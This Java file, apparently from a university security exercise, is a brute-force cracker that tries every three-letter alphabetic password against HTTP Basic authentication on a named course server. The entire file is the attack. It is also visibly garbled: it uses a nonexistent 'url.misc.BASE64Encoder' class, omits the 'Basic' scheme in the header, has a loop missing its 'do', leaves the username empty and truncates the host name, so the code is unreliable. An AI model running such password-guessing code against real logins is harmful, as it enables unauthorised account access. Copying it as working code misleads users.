
import java.io.*;
import java.net.*;

public class BruteForce
{
   private String myUsername = "";
   private String urlToCrack = "http://sec-crack.cs.rmit.edu./SEC/2";
   private int NUM_CHARS = 52;


   public static void main(String args[])
   {
      BruteForce bf = new BruteForce();
   }


   public BruteForce()
   {
      generatePassword();
   }


   

  public void generatePassword()
  {
      int index1 = 0, index2, index3;

      char passwordChars[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I',
                               'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
                               'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
                               'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i',
                               'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r',
                               's', 't', 'u', 'v', 'w', 'x', 'y', 'z' };


      while(index1 < NUM_CHARS)
      {
         index2 = 0;

         while(index2 < NUM_CHARS)
         {
            index3 = 0;

            while(index3 < NUM_CHARS)
            {
               crackPassword(new String("" + passwordChars[index1] + passwordChars[index2] + passwordChars[index3]));
               index3++;
            }

            index2++;
         }

         index1++;
      }
  }


  

  public void crackPassword(String passwordToCrack)
  {
     String data, dataToEncode, encodedData;

     try
     {
         URL url = new URL (urlToCrack);

         

         dataToEncode = myUsername + ":" + passwordToCrack;

         

         encodedData = new url.misc.BASE64Encoder().encode(dataToEncode.getBytes());

         URLConnection urlCon = url.openConnection();
         urlCon.setRequestProperty("Authorization", " " + encodedData);

         InputStream is = (InputStream)urlCon.getInputStream();
         InputStreamReader isr = new InputStreamReader(is);
         BufferedReader bf = new BufferedReader(isr);

         

          
          {
             data = bf.readLine();
             System.out.println(data);
             displayPassword(passwordToCrack);
         } while (data != null);
      }
      catch (IOException e)
      {   }
   }

   public void displayPassword(String foundPassword)
   {
      System.out.println("\nThe cracked password is : " + foundPassword);
      System.exit(0);
   }
}
